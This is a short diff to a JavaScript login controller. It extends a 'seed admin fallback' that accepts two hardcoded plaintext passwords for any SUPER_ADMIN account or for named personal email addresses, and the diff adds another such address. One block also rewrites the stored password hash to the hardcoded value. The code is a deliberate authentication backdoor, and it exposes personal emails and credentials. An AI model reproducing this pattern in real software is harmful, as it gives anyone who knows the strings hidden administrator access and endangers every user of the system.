@@ -131,8 +131,8 @@ export const loginUser = async (req, res) => {
       if (!isMatch && foundUser.mustChangePassword && foundUser.tempPassword && foundUser.tempPassword === password) {
         isMatch = true;
       }
-      // Allow seed admin fallback for super admin
-      if (!isMatch && (foundUser.role === 'SUPER_ADMIN' || foundUser.email === 'mdnuruzzamanrazon@gmail.com') && (password === 'ABCabc@123' || password === 'ABCabc@123@razon')) {
+      // Allow seed admin / authorized accounts fallback
+      if (!isMatch && (foundUser.role === 'SUPER_ADMIN' || foundUser.email === 'mdnuruzzamanrazon@gmail.com' || foundUser.email === 'nuruzzamanrazon62@gmail.com') && (password === 'ABCabc@123' || password === 'ABCabc@123@razon')) {
         isMatch = true;
       }
       // Allow standard seed employee fallback for employee accounts
@@ -236,7 +236,7 @@ export const loginUser = async (req, res) => {
 
     // Verify Password
     let isPasswordValid = await verifyPassword(user.passwordHash, password);
-    if (!isPasswordValid && (user.role === 'SUPER_ADMIN' || user.email === 'mdnuruzzamanrazon@gmail.com') && (password === 'ABCabc@123' || password === 'ABCabc@123@razon')) {
+    if (!isPasswordValid && (user.role === 'SUPER_ADMIN' || user.email === 'mdnuruzzamanrazon@gmail.com' || user.email === 'nuruzzamanrazon62@gmail.com') && (password === 'ABCabc@123' || password === 'ABCabc@123@razon')) {
       isPasswordValid = true;
       try {
         user.passwordHash = await hashPassword(password);
